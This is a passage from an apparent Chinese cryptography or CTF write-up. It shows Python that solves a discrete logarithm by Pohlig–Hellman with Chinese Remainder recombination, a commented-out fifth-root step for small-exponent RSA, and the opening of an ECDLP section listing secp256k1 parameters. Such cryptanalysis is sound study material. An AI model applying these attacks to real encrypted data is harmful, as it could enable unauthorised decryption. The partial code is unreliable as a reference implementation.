class="token punctuation">]</span></pre></td></tr><tr><td data-num="107"></td><td><pre>gi<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="108"></td><td><pre>r<span class="token operator">=</span><span class="token builtin">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="109"></td><td><pre> </pre></td></tr><tr><td data-num="110"></td><td><pre><span class="token keyword">for</span> i <span class="token keyword">in</span> s<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="111"></td><td><pre>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>i<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="112"></td><td><pre>        x<span class="token operator">=</span>x<span class="token operator">*</span>i<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="113"></td><td><pre>        n<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="114"></td><td><pre><span class="token comment">#print(x-(a-1))</span></pre></td></tr><tr><td data-num="115"></td><td><pre> </pre></td></tr><tr><td data-num="116"></td><td><pre> </pre></td></tr><tr><td data-num="117"></td><td><pre><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="118"></td><td><pre>    q<span class="token operator">=</span>a<span class="token operator">//</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="119"></td><td><pre>    x<span class="token operator">=</span><span class="token builtin">pow</span><span class="token punctuation">(</span>g<span class="token punctuation">,</span>q<span class="token punctuation">,</span>a<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="120"></td><td><pre>    gi<span class="token punctuation">.</span>append<span class="token punctuation">(</span>x<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="121"></td><td><pre><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="122"></td><td><pre>    q<span class="token operator">=</span>a<span class="token operator">//</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="123"></td><td><pre>    x<span class="token operator">=</span><span class="token builtin">pow</span><span class="token punctuation">(</span>h<span class="token punctuation">,</span>q<span class="token punctuation">,</span>a<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="124"></td><td><pre>    hi<span class="token punctuation">.</span>append<span class="token punctuation">(</span>x<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="125"></td><td><pre> </pre></td></tr><tr><td data-num="126"></td><td><pre><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="127"></td><td><pre>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="128"></td><td><pre>        x<span class="token operator">=</span>j</pre></td></tr><tr><td data-num="129"></td><td><pre>        t<span class="token operator">=</span><span class="token builtin">pow</span><span class="token punctuation">(</span>gi<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span>x<span class="token punctuation">,</span>a<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="130"></td><td><pre>        <span class="token keyword">if</span><span class="token punctuation">(</span>t<span class="token operator">==</span>hi<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="131"></td><td><pre>            c<span class="token punctuation">.</span>append<span class="token punctuation">(</span>x<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="132"></td><td><pre>            <span class="token keyword">break</span></pre></td></tr><tr><td data-num="133"></td><td><pre>        </pre></td></tr><tr><td data-num="134"></td><td><pre> </pre></td></tr><tr><td data-num="135"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="136"></td><td><pre><span class="token comment">#print(hi)</span></pre></td></tr><tr><td data-num="137"></td><td><pre><span class="token comment">#print(gi)</span></pre></td></tr><tr><td data-num="138"></td><td><pre><span class="token comment">#print(len(c)-len(n))</span></pre></td></tr><tr><td data-num="139"></td><td><pre>    </pre></td></tr><tr><td data-num="140"></td><td><pre>    </pre></td></tr><tr><td data-num="141"></td><td><pre> </pre></td></tr><tr><td data-num="142"></td><td><pre> </pre></td></tr><tr><td data-num="143"></td><td><pre>Z<span class="token operator">=</span><span class="token number">1</span><span class="token comment">#即是 m</span></pre></td></tr><tr><td data-num="144"></td><td><pre><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="145"></td><td><pre>    Z<span class="token operator">=</span>Z<span class="token operator">*</span>n<span class="token punctuation">[</span>i<span class="token punctuation">]</span>  </pre></td></tr><tr><td data-num="146"></td><td><pre><span class="token comment">#print(Z)</span></pre></td></tr><tr><td data-num="147"></td><td><pre> </pre></td></tr><tr><td data-num="148"></td><td><pre>z<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token comment">#保存的是每一项的 ai*Mi*Mi'</span></pre></td></tr><tr><td data-num="149"></td><td><pre> </pre></td></tr><tr><td data-num="150"></td><td><pre><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="151"></td><td><pre>    Mi<span class="token operator">=</span><span class="token punctuation">(</span>Z<span class="token operator">//</span>n<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment">#即是 Mi</span></pre></td></tr><tr><td data-num="152"></td><td><pre>    <span class="token comment">#print(Mi)</span></pre></td></tr><tr><td data-num="153"></td><td><pre>    x<span class="token operator">=</span><span class="token punctuation">(</span>answer<span class="token punctuation">(</span>Mi<span class="token punctuation">,</span><span class="token builtin">int</span><span class="token punctuation">(</span>n<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#求出 Mi'</span></pre></td></tr><tr><td data-num="154"></td><td><pre>    <span class="token keyword">print</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="155"></td><td><pre>    s<span class="token operator">=</span>Mi<span class="token operator">*</span>x</pre></td></tr><tr><td data-num="156"></td><td><pre>    <span class="token comment">#print(s)</span></pre></td></tr><tr><td data-num="157"></td><td><pre>    s<span class="token operator">=</span>s<span class="token operator">*</span>c<span class="token punctuation">[</span>i<span class="token punctuation">]</span></pre></td></tr><tr><td data-num="158"></td><td><pre>    z<span class="token punctuation">.</span>append<span class="token punctuation">(</span>s<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="159"></td><td><pre>    </pre></td></tr><tr><td data-num="160"></td><td><pre>ans<span class="token operator">=</span><span class="token number">0</span><span class="token comment">#求和的结果</span></pre></td></tr><tr><td data-num="161"></td><td><pre><span class="token keyword">for</span> i <span class="token keyword">in</span> z<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="162"></td><td><pre>        ans<span class="token operator">=</span>ans<span class="token operator">+</span>i</pre></td></tr><tr><td data-num="163"></td><td><pre> </pre></td></tr><tr><td data-num="164"></td><td><pre>p<span class="token operator">=</span>ans<span class="token operator">%</span>Z<span class="token comment">#即是密文的 e 次方</span></pre></td></tr><tr><td data-num="165"></td><td><pre><span class="token comment">#a=e [0]# 本题的加密指数为 5</span></pre></td></tr><tr><td data-num="166"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="167"></td><td><pre> </pre></td></tr><tr><td data-num="168"></td><td><pre><span class="token triple-quoted-string string">'''#———————————————————————以下为大数开方(考虑牛顿迭代法)———————————————#</pre></td></tr><tr><td data-num="169"></td><td><pre>def five_e_root(x):</pre></td></tr><tr><td data-num="170"></td><td><pre>        if(x==0):</pre></td></tr><tr><td data-num="171"></td><td><pre>                return 0</pre></td></tr><tr><td data-num="172"></td><td><pre>        x0=x</pre></td></tr><tr><td data-num="173"></td><td><pre>        x1=(4*x0//5)+(x//(x0*x0*x0*x0*5))#迭代法求五次方根</pre></td></tr><tr><td data-num="174"></td><td><pre>        while(abs(x1-x0)>0.00001):#要求精度</pre></td></tr><tr><td data-num="175"></td><td><pre>                x0=x1</pre></td></tr><tr><td data-num="176"></td><td><pre>                x1=(4*x0//5)+(x//(x0*x0*x0*x0*5))</pre></td></tr><tr><td data-num="177"></td><td><pre>        return x1</pre></td></tr><tr><td data-num="178"></td><td><pre>                </pre></td></tr><tr><td data-num="179"></td><td><pre>#print(p)</pre></td></tr><tr><td data-num="180"></td><td><pre>p=five_e_root(p)</pre></td></tr><tr><td data-num="181"></td><td><pre>#print(p)#结果</pre></td></tr><tr><td data-num="182"></td><td><pre>p=hex(p)#转换为16进制</pre></td></tr><tr><td data-num="183"></td><td><pre>print(p)</pre></td></tr><tr><td data-num="184"></td><td><pre>        '''</span></pre></td></tr></table></figure><h3 id="ecdlp"><a class="anchor" href="#ecdlp">#</a> ECDLP</h3>
<p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mtext>椭圆曲线是</mtext><mi>s</mi><mi>e</mi><mi>c</mi><mi>p</mi><mn>256</mn><mi>k</mi><mn>1</mn><mspace width="1em"/><msup><mi>y</mi><mn>2</mn></msup><mo>=</mo><msup><mi>x</mi><mn>3</mn></msup><mo>+</mo><mi>a</mi><mi>x</mi><mo>+</mo><mi>b</mi><mtext>，其中</mtext><mi>a</mi><mo>=</mo><mn>0</mn><mtext>，</mtext><mi>b</mi><mo>=</mo><mn>7</mn><mspace width="1em"/><mi>p</mi><mo>=</mo><mi>F</mi><mi>F</mi><mi>F</mi><mi>F</mi><mi>F</mi><mi>F</mi><mi>F</mi><mi>F</mi><mspace width="1em"/><mi>F</mi><mi>F</mi><mi>F</mi><mi>F</mi><mi>F</mi><mi>F</mi><mi>F</mi><mi>F</mi><mspace width="1em"/><mi>F</mi><mi>F</mi><mi>F</mi><mi>F</mi><mi>F</mi><mi>F</mi><mi>F</mi><mi>F</mi><mspace width="1em"/><mi>F</mi><mi>F</mi><mi>F</mi><mi>F</mi><mi>F</mi><mi>F</mi><mi>F</mi><mi>F</mi><mspace width="1em"/><mi>F</mi><mi>F</mi><mi>F</mi><mi>F</mi><mi>F</mi><mi>F</mi><mi>F</mi><mi>F</mi><mspace width="1em"/><mi>F</mi><mi>F</mi><mi>F</mi><mi>F</mi><mi>F</mi><mi>F</mi><mi>F</mi><mi>F</mi><mspace width="1em"/><mi>F</mi><mi>F</mi><mi>F</mi><mi>F</mi><mi>F</mi><mi>F</mi><mi>F</mi><mi>E</mi><mspace width="1em"/><mi>F</mi><mi>F</mi><mi>F</mi><mi>F</mi><mi>F</mi><mi>C</mi><mn>2</mn><mi>F</mi><mo>=</mo><msup><mn>2</mn><mn>256</mn></msup><mo>−</mo><msup><mn>2</mn><mn>32</mn></msup><mo>−</mo><msup><mn>2</mn><mn>9</mn></msup><mo>−</mo><msup><mn>2</mn><mn>8</mn></msup><mo>−</mo><msup><mn>2</mn><mn>7</mn></msup><mo>−</mo><msup><mn>2</mn><mn>6</mn></msup><mo>−</mo><msup><mn>2</mn><mn>4</mn></msup><mo>−</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">椭圆曲线是secp256k1 \quad
y^2 = x^3 + ax + b，其中 a = 0，b = 7\quad
p = FFFFFFFF \quad FFFFFFFF \quad  FFFFFFFF \quad  FFFFFFFF \quad  FFFFFFFF  \quad FFFFFFFF \quad  FFFFFFFE  \quad FFFFFC2F = 2 ^ {256} - 2 ^ {32} - 2 ^ 9 - 2 ^ 8 - 2 ^ 7 - 2 ^ 6 - 2 ^ 4 - 1
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0585479999999998em;vertical-align:-0.19444em;"></span><span class="mord cjk_fallback">椭</span><span class="mord cjk_fallback">圆</span><span class="mord cjk_fallback">曲</span><span class="mord cjk_fallback">线</span><span class="mord cjk_fallback">是</span><span class="mord mathnormal">s</span><span class="mord mathnormal">e</span><span class="mord mathnormal">c</span><span class="mord mathnormal">p</span><span class="mord">2</span><span class="mord">5</span><span class="mord">6</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mord">1</span><span class="mspace" style="margin-right:1em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.9474379999999999em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord mathnormal">a</span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">b</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">其</span><span class="mord cjk_fallback">中</span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord">0</span><span class="mord cjk_fallback">，</span><span class="mord mathnormal">b</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8388800000000001em;vertical-align:-0.19444em;"></span><span class="mord">7</span><span class="mspace" style="margin-right:1em;"></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mspace" style="margin-right:1em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mspace" style="margin-right:1em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mspace" style="margin-right:1em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mspace" style="margin-right:1em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mspace" style="margin-right:1em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mspace" style="margin-right:1em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mspace" style="margin-right:1em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord">2</span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.9474379999999999em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">5</span><span class="mord mtight">6</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.9474379999999999em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span><span class="mord mtight">2</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.9474379999999999em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">9</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.9474379999999999em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">8</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.9474379999999999em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">7</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.9474379999999999em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">6</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.9474379999999999em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">4</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span></span></p>
<p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>G</mi><mi mathvariant="normal">.</mi><mi>x</mi><mo>=</mo><mn>79</mn><mi>B</mi><mi>E</mi><mn>667</mn><mi>E</mi><mi>F</mi><mn>9</mn><mi>D</mi><mi>C</mi><mi>B</mi><mi>B</mi><mi>A</mi><mi>C</mi><mn>55</mn><mi>A</mi><mn>06295</mn><mi>C</mi><mi>E</mi><mn>870</mn><mi>B</mi><mn>07029</mn><mi>B</mi><mi>F</mi><mi>C</mi><mi>D</mi><mi>B</mi><mn>2</mn><mi>D</mi><mi>C</mi><mi>E</mi><mn>28</mn><mi>D</mi><mn>959</mn><mi>F</mi><mn>2815</mn><mi>B</mi><mn>16</mn><mi>F</mi><mn>81798</mn></mrow><annotation encoding="application/x-tex">G.x=79BE667EF9DCBBAC55A06295CE870B07029BFCDB2DCE28D959F2815B16F81798
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal">G</span><span class="mord">.</span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord">7</span><span class="mord">9</span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mord">6</span><span class="mord">6</span><span class="mord">7</span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mord">9</span><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="mord mathnormal">A</span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord">5</span><span class="mord">5</span><span class="mord mathnormal">A</span><span class="mord">0</span><span class="mord">6</span><span class="mord">2</span><span class="mord">9</span><span class="mord">5</span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mord">8</span><span class="mord">7</span><span class="mord">0</span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="mord">0</span><span class="mord">7</span><span class="mord">0</span><span class="mord">2</span><span class="mord">9</span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="mord">2</span><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mord">2</span><span class="mord">8</span><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="mord">9</span><span class="mord">5</span><span class="mord">9</span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mord">2</span><span class="mord">8</span><span class="mord">1</span><span class="mord">5</span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="mord">1</span><span class="mord">6</span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mord">8</span><span class="mord">1</span><span class="mord">7</span><span class="mord">9</span><span class="mord">8</span></span></span></span></span></p>
<p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>G</mi><mi mathvariant="normal">.</mi><mi>y</mi><mo>=</mo><mn>483</mn><mi>a</mi><mi>d</mi><mi>a</mi><mn>7726</mn><mi>a</mi><mn>3</mn><mi>c</mi><mn>4655</mn><mi>d</mi><mi>a</mi><mn>4</mn><mi>f</mi><mi>b</mi><mi>f</mi><mi>c</mi><mn>0</mn><mi>e</mi><mn>1108</mn><mi>a</mi><mn>8</mn><mi>f</mi><mi>d</mi><mn>17</mn><mi>b</mi><mn>448</mn><mi>a</mi><mn>68554199</mn><mi>c</mi><mn>47</mn><mi>d</mi><mn>08</mn><mi>f</mi><mi>f</mi><mi>b</mi><mn>10</mn><mi>d</mi><mn>4</mn><mi>b</mi><mn>8</mn></mrow><annotation encoding="application/x-tex">G.y=483ada7726a3c4655da4fbfc0e1108a8fd17b448a68554199c47d08ffb10d4b8
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">G</span><span class="mord">.</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord">4</span><span class="mord">8</span><span class="mord">3</span><span class="mord mathnormal">a</span><span class="mord mathnormal">d</span><span class="mord mathnormal">a</span><span class="mord">7</span><span class="mord">7</span><span class="mord">2</span><span class="mord">6</span><span class="mord mathnormal">a</span><span class="mord">3</span><span class="mord mathnormal">c</span><span class="mord">4</span><span class="mord">6</span><span class="mord">5</span><span class="mord">5</span><span class="mord mathnormal">d</span><span class="mord mathnormal">a</span><span class="mord">4</span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mord mathnormal">b</span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mord mathnormal">c</span><span class="mord">0</span><span class="mord mathnormal">e</span><span class="mord">1</span><span class="mord">1</span><span class="mord">0</span><span 